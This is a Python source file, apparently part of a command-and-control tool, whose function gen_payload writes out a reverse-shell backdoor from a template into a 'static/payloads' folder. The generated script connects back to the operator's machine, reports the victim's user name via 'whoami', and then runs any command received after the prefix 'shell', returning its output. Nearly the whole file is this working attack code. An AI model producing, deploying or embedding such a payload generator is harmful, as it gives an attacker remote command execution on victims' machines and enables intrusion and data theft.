import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]
string = """
import os, subprocess, socket
import ssl


def connect():
    try:
        global host
        global port
        global s
        global sock

        host = "{host}"
        port = {port}
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
        print("Trying to Connect")
        s.connect((host, port))
        print("Connection Established")
        s.send(os.popen("whoami").read())
    except socket.error as msg:
        print("socket error : " + str(msg[0]))


def receive():
    receive2 = s.recv(1024)
    if receive2 == 'quit' or receive2 == 'exit':
        s.close()
    elif receive2[0:5] == 'shell':
        proc2 = subprocess.Popen(receive2[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc2.stdout.read() + proc2.stderr.read()
        args = output
    else:
        args = "Invalid Command"
    send(args)


def send(args):
    send = s.send(args)
    receive()


connect()
receive()
s.close()
"""


def gen_payload(id, port):
    var = {'host': ip, 'port':port}
    file_name = 'static/payloads/listener-%d.py' %id
    f = open(file_name,'w')
    f.write(string.format(**var))
    f.close()